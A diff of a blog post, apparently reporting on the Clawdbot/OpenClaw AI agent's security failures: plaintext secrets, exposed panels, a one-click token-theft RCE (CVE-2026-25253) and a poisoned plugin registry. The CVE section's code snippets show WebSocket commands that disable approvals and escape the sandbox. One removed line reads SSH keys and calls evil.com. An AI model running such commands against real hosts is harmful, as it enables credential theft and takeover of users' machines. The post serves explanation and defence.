@@ -1,218 +1,147 @@
 ---
-title: "Clawdbot: How a Lobster Turned Into a Security Nightmare in 10 Seconds Flat"
+title: "Clawdbot's Security Crisis: What Went Wrong"
 publishDate: "2026-02-04T10:00:00.000Z"
-slug: "clawdbot-moltbot-openclaw-security-chaos"
-description: "The story of how a bored Austrian developer created the fastest-growing AI project on GitHub, got C&D'd by Anthropic, lost his handles to crypto scammers in 10 seconds, and accidentally built a RAT with an LLM interface. Also, your credentials are probably on Shodan right now."
-tags: ["ai", "security", "open-source", "clawdbot", "openclaw", "anthropic", "hacking", "opinion", "chaos", "vibe-coding"]
+slug: "clawdbot-moltbot-openclaw-security-analysis"
+description: "A breakdown of how Clawdbot became the fastest-growing GitHub project ever, the trademark drama with Anthropic, and the security vulnerabilities that turned it into a cautionary tale about AI agent development."
+tags: ["ai", "security", "open-source", "clawdbot", "openclaw", "anthropic", "vulnerabilities", "analysis"]
 featured: true
 draft: false
-readTime: 14
+readTime: 12
 ---
 
-## When Retirement Gets Boring
+## What Happened
 
-Look, I need to tell you about the absolute chaos that unfolded over the past couple of weeks. And no, for once it's not another JavaScript framework (though give it a week). This time it's about a bored Austrian developer, a space lobster, Anthropic's legal team, crypto scammers, and a security vulnerability that has infosec people screaming into the void.
+Holy shit, what a two weeks this has been. An open source project called Clawdbot went from obscurity to 82,000 GitHub stars, got hit with a trademark complaint from Anthropic, accidentally enabled a $16 million crypto scam, and became the subject of multiple security advisories. I couldn't make this up if I tried.
 
-Let me introduce you to [Peter Steinberger](https://steipete.com/), the guy who built and sold PSPDFKit, retired rich, got bored, and decided that "vibe coding" with AI was his new personality trait. His X bio literally says "Came back from retirement to mess with AI." Relatable, I guess, if your idea of relaxation involves accidentally building the most controversial open source project of 2026.
+[Peter Steinberger](https://steipete.com/), the creator, is an Austrian developer who previously built PSPDFKit. After selling that company he got into what people are calling "vibe coding" - using AI agents to write code while he focuses on higher-level decisions. His X bio says "Came back from retirement to mess with AI."
 
-So what did Peter do? He noticed that when you run AI agents like Claude Code or Codex, they sometimes just... stop. They need input. They stall. And you have to sit there babysitting them like they're toddlers who forgot what they were doing mid-task. Peter wanted to check on his AI from his phone. Simple enough, right?
+The problem he wanted to solve was simple: AI coding agents like Claude Code sometimes stall waiting for input, and he wanted to monitor them from his phone. Classic "nobody built what I need so I'll build it myself" energy. When no one else made this by November 2025, he did it himself. The initial version just connected WhatsApp to Claude. Sounds innocent enough, right?
 
-"When nobody had built it by last November, I decided: fine, I'll do it myself."
+## How Clawdbot Works
 
-And thus, Clawdbot was born. A cute little space lobster mascot, a WhatsApp integration, and the beginning of what I can only describe as a cybersecurity horror movie that nobody auditioned for.
+Clawdbot is a local AI assistant you control through messaging apps - WhatsApp, Telegram, iMessage. Unlike cloud assistants, everything runs on your machine. You text it commands like "check my calendar" or "respond to that email from John" and it executes them through whatever LLM you configure.
 
-## What The Hell Is Clawdbot Anyway?
+The privacy angle is genuinely interesting. No corporate servers storing your conversations. No data being harvested for ads. Your AI assistant lives on hardware you control. I actually like this idea a lot.
 
-Imagine if you could text your computer like it's your personal assistant. "Hey, check my emails." "Book that restaurant for 8pm." "What meetings do I have tomorrow?" That's Clawdbot. An AI assistant that connects via WhatsApp, Telegram, or iMessage to whatever LLM you want (Claude, GPT, whatever) and can actually do things on your machine.
+The problem is what "runs on your machine" actually means in practice. Spoiler: it's not great.
 
-Unlike Siri or Alexa, which live in corporate cloud prisons, Clawdbot runs locally. Your data stays on your machine. No corporate surveillance. Sounds great, right? Privacy advocates rejoice! Your conversations aren't being fed to some advertising algorithm!
+## The Anthropic Trademark Situation
 
-Except there's a tiny little problem. When security researchers started actually looking at how this thing works, they found something concerning.
+Peter named his project after a space lobster character called "Clawd." On January 27th, Anthropic's legal team sent a trademark request - the name was too similar to Claude. Peter agreed to rebrand rather than fight it.
 
-```javascript
-// how Clawdbot stores your secrets apparently
-const storeCredentials = (secrets) => {
-  fs.writeFileSync('~/.clawdbot/secrets.json', JSON.stringify(secrets));
-  // encryption is for nerds
-  // also its plaintext markdown sometimes lol
-}
+He chose "Moltbot" (lobsters molt when they grow) and started renaming his accounts. During the seconds between releasing the old username and claiming the new one, crypto scammers grabbed his handles. They had been watching and waiting.
+
+Within hours, fake $CLAWD tokens launched on Solana. Market cap hit $16 million before crashing. People lost money. Sixteen million dollars! Peter spent his rebrand day tweeting "Any project that lists me as coin owner is a SCAM" while scammers profited. What a nightmare. Crypto bros ruin everything, as usual.
+
+DHH called Anthropic's trademark move "customer hostile" since Clawdbot was driving significant Claude API usage. The project eventually settled on "OpenClaw" as its permanent name.
+
+I dont have strong feelings about the trademark dispute itself. Companies protect their trademarks or they lose them. But the timing created an opening that bad actors exploited immediately. Thats worth noting for anyone planning a public rebrand.
+
+## The Security Problems
+
+Okay, this is where I started losing my mind. Buckle up.
+
+### Plaintext Credential Storage
+
+Clawdbot stores sensitive data in `~/.clawdbot/` as plaintext JSON and Markdown files. API tokens, VPN credentials, conversation history spanning months - all readable by any process running under your user account.
+
+```
+~/.clawdbot/
+├── config.json          # API keys in plaintext
+├── memory/
+│   ├── conversations.md # months of chat history
+│   └── secrets.json     # credentials you've mentioned
+└── skills/
+    └── ...              # third-party plugins with full access
 ```
 
-Yeah. All your VPN credentials, API tokens, corporate passwords, months of conversation history... sitting in plaintext in your home directory. Readable by literally any process running as your user. But we'll get to that. First, let's talk about what happens when you name your project a bit too close to an AI company's flagship product.
+This isn't unusual for developer tools honestly - most of us have credentials sitting in plaintext somewhere we'd rather not admit. But Clawdbot specifically handles sensitive operations. When your tool's whole job is "control my computer via WhatsApp," maybe don't store secrets like it's 2003.
 
-## Anthropic Has Entered The Chat
+### Exposed Control Panels
 
-So Peter named his project "Clawdbot" with a cute character called "Clawd" - a playful space lobster. Adorable, right? Apparently a little too close to "Claude" for Anthropic's legal team.
+Security researcher [Jamieson O'Reilly](https://dvuln.com/) from Dvuln found hundreds of Clawdbot instances exposed to the public internet. 8 had completely open ports with no authentication. 47 more had authentication but were still publicly accessible.
 
-On January 27th, Anthropic sent a trademark request. The lobster was too similar to the... uh... whatever Claude is supposed to be. Peter, being a reasonable person and not wanting to get sued into oblivion, agreed to rebrand. He chose "Moltbot" - because lobsters molt when they grow. Clever wordplay. Everyone's happy.
+The exposed instances contained private messages, credentials, and API keys. Just... sitting there. On the public internet. [Hudson Rock](https://www.hudsonrock.com/) researchers confirmed that infostealer malware families (RedLine, Lumma, Vidar) added Clawdbot directories to their target lists within 48 hours of the project going viral. The malware authors moved faster than some people update their npm packages. Depressing.
 
-Except for what happened next.
+### CVE-2026-25253
 
-During the literal seconds it took to rename his GitHub and X/Twitter accounts, crypto scammers pounced. "My old name was snatched in 10 seconds," Peter later said. TEN SECONDS. These vultures had been monitoring, waiting for exactly this moment.
+Security researcher Mav Levin discovered a critical vulnerability with a CVSS score of 8.8. The attack chain:
 
-Within hours, fake $CLAWD tokens launched on Solana. The market cap hit $16 million as speculators thought they were getting in early on the next big AI project. Peter had to frantically tweet "Any project that lists me as coin owner is a SCAM" while watching people get rugged in real-time.
+1. OpenClaw's Control UI accepts a `gatewayUrl` parameter from the query string without validation
+2. It auto-connects on page load, sending the gateway token via WebSocket
+3. An attacker hosts a malicious page that steals the token and establishes unauthorized WebSocket connections
+4. The server accepts requests regardless of origin header
 
-The token collapsed. Scammers walked away with millions. Late buyers lost everything. And Peter was left dealing with both a rebrand AND a crypto fraud scheme wearing his project's skin. What a Tuesday.
-
-DHH, never one to miss an opportunity to criticize a tech company, labeled Anthropic's trademark move as "customer hostile." Others pointed out the irony - Clawdbot was driving massive Claude API usage. Anthropic was essentially kneecapping a project that was making them money. But hey, trademark lawyers gotta trademark lawyer.
-
-The project eventually settled on "OpenClaw" as its final name. By this point it had 82,000 GitHub stars. The fastest-growing repo in GitHub history. Everyone wanted to try the thing that Anthropic didn't want named after their chatbot. Streisand effect goes brrr.
-
-## "I Ship Code I Don't Read"
-
-Now here's where things get philosophically terrifying. Peter's approach to building this thing was... unique. In a Pragmatic Engineer interview, he dropped this gem: "I ship code I don't read."
-
-Let that sink in. The creator of the most viral AI agent admits he doesn't read the code his AI writes for him. "Pull requests are dead, long live prompt requests," he said. He focuses on the prompts that generate code, not the code itself.
-
-Look, I get the appeal of vibe coding. Let the AI do the boring stuff. But when your project has direct access to people's computers, can read their files, execute commands, access credentials, and control their digital lives... maybe read the code? Just a thought? Anyone?
+With a stolen token that has `operator.admin` scope, an attacker can disable user confirmations, escape container sandboxes, and execute arbitrary commands on the host system. Game over. Your machine belongs to someone else now.
 
 ```javascript
-// Peter's development workflow, probably
-const developFeature = async (feature) => {
-  const code = await claude.generate(feature);
-  // reading is for people who have time
-  // also I trust you little guy
-  await git.commit(code);
-  await git.push();
-  // ship it
-}
-```
-
-I'm being a bit unfair. Peter actually advocates for "closing the loop" - letting AI verify its own work through tests and linting. But still. The guy built a tool that runs with full user privileges and identity, and his philosophy is "I don't read the code." Security researchers everywhere felt a disturbance in the Force.
-
-## The Security Nightmare Begins
-
-Let's talk about what happened when actual security professionals started poking at this thing. Spoiler: it's bad.
-
-[Jamieson O'Reilly](https://dvuln.com/), founder of security firm Dvuln, found hundreds of Clawdbot instances exposed to the public internet. Not behind authentication. Just... open. He found 8 instances with completely open ports requiring zero authentication. 47 more with authentication but still accessible. The rest showed "varying levels of protection," which is security researcher speak for "a mess."
-
-These exposed instances contained months of private messages, credentials, and API keys. Just sitting there. On Shodan. Waiting to be harvested.
-
-[Hudson Rock](https://www.hudsonrock.com/) researchers found that commodity infostealers had already adapted. RedLine, Lumma, and Vidar - the Walmart of malware families - added Clawdbot directories to their target lists. Their FileGrabber modules now specifically sweep `%UserProfile%\.clawdbot\*.json` looking for secrets. These files contain everything from Jira credentials to VPN configs to literally months of conversation context.
-
-The kicker? This happened within 48 hours of the project going viral. Infostealers added it to their target lists before most security teams even knew their employees were running it.
-
-## CVE-2026-25253: The One-Click RCE
-
-Then came the big one. Security researcher [Mav Levin](https://depthfirst.io/) discovered CVE-2026-25253 - a vulnerability with a CVSS score of 8.8 (that's bad). One-click remote code execution via a malicious link. Here's how it works:
-
-The OpenClaw Control UI trusts `gatewayUrl` from the query string without validation. It auto-connects on load, sending your gateway token in the WebSocket payload. An attacker creates a malicious webpage with JavaScript that steals your auth token and establishes unauthorized WebSocket connections to your local OpenClaw server. The server accepts requests from any website because it doesn't validate origin headers.
-
-```javascript
-// how the attack works (simplified)
-// attacker's malicious webpage
-
-const stolenToken = getFromVictimBrowser();
+// simplified attack flow
 const ws = new WebSocket('ws://localhost:8080/gateway');
-
 ws.onopen = () => {
-  // now I own your computer
   ws.send(JSON.stringify({
     token: stolenToken,
     command: 'exec.approvals.set',
-    value: 'off' // disable all safety checks
+    value: 'off'
   }));
-
-  // escape docker sandbox
   ws.send(JSON.stringify({
     command: 'tools.exec.host',
-    value: 'gateway' // run on host, not container
+    value: 'gateway'
   }));
-
-  // do whatever I want
-  ws.send(JSON.stringify({
-    command: 'run',
-    value: 'cat ~/.ssh/id_rsa && curl evil.com/pwned'
-  }));
+  // attacker now has host-level command execution
 };
 ```
 
-The vulnerability was patched in version 2026.1.29, but the damage was done. How many instances are still running older versions? Based on the "I ship code I don't read" philosophy, I'm guessing a non-trivial amount.
+This was patched in version 2026.1.29.
 
-## Supply Chain Attacks: The Cherry On Top
+### Supply Chain Risk
 
-O'Reilly didn't stop at exposed instances. He demonstrated a supply chain attack on ClawdHub - the public registry where people share Clawdbot skills. Think npm, but for AI agent plugins. And with approximately zero moderation.
+O'Reilly also demonstrated a supply chain attack on ClawdHub, the registry for Clawdbot plugins. He uploaded a proof-of-concept malicious package, artificially inflated its download count to 4,000+, and tracked installations across 7 countries. Seven countries! The registry has no code review process. Plugins inherit full Clawdbot privileges. It's npm but somehow worse.
 
-He uploaded a poisoned skill package that appeared legitimate. Artificially inflated the download count to 4,000+. Developers across 7 countries downloaded and installed it. The skills run with full Clawdbot privileges. No sandboxing. No code signing. No review process.
+## The Numbers
 
-One researcher described new users as "essentially installing a remote access trojan (RAT) with an LLM interface." They think they're getting a simple productivity tool. What they're actually getting is kernel access with natural language commands.
+[Noma Security](https://noma.security/) published research showing 53% of enterprise customers granted Clawdbot privileged access over the weekend of January 24-27. Three days for over half of enterprise users to deploy an AI agent with system-level access.
 
-## 53% Of Enterprises Gave It Privileged Access Over A Weekend
+Their analysis identified five vulnerability categories:
+- Control plane exposure through misconfigured proxies
+- Unrestricted command acceptance from external messaging platforms
+- Sandbox configurations with overly permissive defaults
+- Plaintext credential storage
+- Unvetted community plugins with inherited privileges
 
-[Noma Security](https://noma.security/) dropped a stat that made every CISO I know break out in hives: **53% of enterprise customers gave Clawdbot privileged access over the weekend of January 24-27.**
+When run as root - which the research describes as a "common misconfiguration" (who the hell runs things as root in 2026?!) - Clawdbot has complete system control.
 
-A weekend. Less than 72 hours for more than half of enterprise users to grant full system access to an AI agent they read about on Hacker News.
+## The Development Philosophy Question
 
-The research found five major vulnerability categories:
+Okay, here's where I have opinions. Strong ones.
 
-1. **Control Plane Exposure**: Misconfigured proxies exposing admin panels to the internet
-2. **Unrestricted Channel Access**: The bot accepts instructions from external messaging platforms with minimal restrictions
-3. **Sandbox Failures**: Default execution uses full user privileges
-4. **Plaintext Credential Storage**: We covered this - it's bad
-5. **Supply Chain Vulnerabilities**: Community plugins inherit full privileges with zero vetting
+In a [Pragmatic Engineer interview](https://newsletter.pragmaticengineer.com/p/the-creator-of-clawd-i-ship-code), Steinberger said "I ship code I don't read." His workflow focuses on prompts and high-level architecture while AI handles implementation details. He advocates for "closing the loop" - letting AI verify its own work through tests and linting.
 
-When run as root - which apparently is a "common misconfiguration" - Clawdbot has complete kernel control. Your AI assistant can now do literally anything to your system. Progress!
+This approach works for plenty of projects. CRUD apps, internal tools, prototypes - sure, vibe away. But Clawdbot operates with full user privileges, handles credentials, and accepts commands from external messaging platforms. The attack surface is massive. You can't "vibe" your way through security-sensitive code. Someone has to actually read it.
 
-## The Expert Responses
+Look, I'm not trying to pile on Steinberger. He built something people clearly wanted - 82,000 stars dont happen by accident. The guy sold a successful company and came back because he was bored. I respect that. And the vulnerabilities discovered are the kind that emerge when projects scale way faster than anyone anticipated. But man, "I ship code I don't read" is a hell of a philosophy when that code can execute arbitrary commands on someone's machine.
 
-Security experts have been... not optimistic.
+## What Security Researchers Recommend
 
-[Heather Adkins](https://cloud.google.com/security) from Google Cloud's security team had the most succinct advice: **"Don't run Clawdbot."**
+If you're running OpenClaw:
 
-Eric Schwake from Salt Security noted: "A significant gap exists between consumer enthusiasm for Clawdbot's one-click appeal and the technical expertise needed to operate securely."
+1. Update to version 2026.1.29 or later
+2. Bind the control plane to localhost only
+3. Enable authentication
+4. Run in a container or VM with minimal privileges
+5. Audit community plugins before installation
+6. Consider whether you actually need an AI agent with this level of system access
 
-Translation: people who can barely remember their passwords are deploying AI agents with root access because a cool demo video made it look easy.
+[Heather Adkins](https://cloud.google.com/security) from Google Cloud's security team offered simpler advice: "Don't run Clawdbot." Ouch. But fair.
 
-Cisco's security team labeled it a potential "security nightmare." Palo Alto Networks called it "the next AI security crisis." And somewhere, Peter Steinberger is probably reading all this while going for a morning walk and recording a podcast about it.
+Cisco's security team described it as a potential "security nightmare." Palo Alto Networks called it a preview of "the next AI security crisis." When enterprise security vendors agree on something, you know it's bad.
 
-## The Problem Nobody Wants To Admit
+## Looking Forward
 
-Here's the thing that makes this whole situation so frustrating. The concept isn't bad. Having an AI assistant that can actually do things on your computer is genuinely useful. Running it locally instead of in the cloud is, in theory, better for privacy.
+Here's the thing - the underlying concept actually has merit. Local AI assistants that dont ship your data to corporate servers could be genuinely better for privacy. I want this future! I just don't want it to come with free remote code execution for anyone who finds my IP address.
 
-But the implementation was rushed. The security model was basically "trust everything." And the person building it openly admits to not reading the code.
+The Clawdbot situation is probably a preview of whats coming as more AI agents get deployed with system-level access. We're going to see a lot more of these. The gap between "cool demo on Twitter" and "production-ready security model" is massive, and most users cant tell the difference until it's too late.
 
-This is the vibe coding endgame. Move fast, let AI write everything, ship without review, deal with consequences later. It works fine when you're building a todo app. It's a catastrophe when you're building something with system-level access.
-
-```javascript
-// the philosophical problem
-const aiDevelopment = {
-  speed: "very fast",
-  innovation: "exciting",
-  securityReview: null,
-  consequences: "somebody else's problem",
-
-  async build() {
-    while (true) {
-      await this.ship();
-      if (this.securityResearchersPanicking) {
-        await this.hotfix();
-      }
-    }
-  }
-};
-```
-
-I'm not saying AI-assisted development is bad. I use it myself. But maybe - just maybe - when you're building tools that access credentials, execute commands, and have kernel access, you should actually look at what you're shipping?
-
-## What Now?
-
-If you're running Clawdbot/Moltbot/OpenClaw, here's what security researchers recommend:
-
-1. Update to version 2026.1.29 or later (the one with the RCE patch)
-2. Never expose the control plane to the internet
-3. Always use authentication
-4. Isolate it in a container or VM with minimal privileges
-5. Don't run it as root (why would you even)
-6. Audit any community plugins before installing
-7. Consider if you actually need an AI with system access, or if you just thought the demo was cool
-
-Honestly? The safest option might be Heather Adkins' advice. Just don't run it. At least not until the security model matures beyond "plaintext files and trust."
-
-The project has potential. Local AI assistants that respect privacy could be transformative. But right now, it's a security research playground masquerading as a productivity tool. The 82,000 GitHub stars don't mean it's safe - they mean it's popular. Those aren't the same thing.
-
-And Peter? He's already moved on to letting AI agents build their own social networks. Yes, really. That's a whole other article.
-
-Welcome to 2026, where your AI assistant might be a security nightmare, but at least it has a cute lobster mascot.
+For now, the 82,000 GitHub stars represent enthusiasm, not a security audit. Those really, really arent the same thing. Ask me how I know.
 
 ---
 
@@ -220,7 +149,8 @@ Welcome to 2026, where your AI assistant might be a security nightmare, but at l
 
 - [The Register: Clawdbot becomes Moltbot](https://www.theregister.com/2026/01/27/clawdbot_moltbot_security_concerns/)
 - [The Hacker News: OpenClaw RCE Vulnerability](https://thehackernews.com/2026/02/openclaw-bug-enables-one-click-remote.html)
-- [InfoStealers: ClawdBot The New Target](https://www.infostealers.com/article/clawdbot-the-new-primary-target-for-infostealers-in-the-ai-era/)
-- [Noma Security: Clawdbot Privileged Access Research](https://noma.security/blog/customers-gave-clawdbot-privileged-access-and-noone-asked-permission/)
-- [Pragmatic Engineer: Interview with Peter Steinberger](https://newsletter.pragmaticengineer.com/p/the-creator-of-clawd-i-ship-code)
-- [DEV Community: The Complete Chaos Timeline](https://dev.to/sivarampg/from-clawdbot-to-moltbot-how-a-cd-crypto-scammers-and-10-seconds-of-chaos-took-down-the-4eck)
+- [InfoStealers: ClawdBot as Infostealer Target](https://www.infostealers.com/article/clawdbot-the-new-primary-target-for-infostealers-in-the-ai-era/)
+- [Noma Security: Enterprise Adoption Research](https://noma.security/blog/customers-gave-clawdbot-privileged-access-and-noone-asked-permission/)
+- [Pragmatic Engineer: Steinberger Interview](https://newsletter.pragmaticengineer.com/p/the-creator-of-clawd-i-ship-code)
+- [DEV Community: Timeline of Events](https://dev.to/sivarampg/from-clawdbot-to-moltbot-how-a-cd-crypto-scammers-and-10-seconds-of-chaos-took-down-the-4eck)
+- [SecurityWeek: OpenClaw Hijacking Vulnerability](https://www.securityweek.com/vulnerability-allows-hackers-to-hijack-openclaw-ai-assistant/)
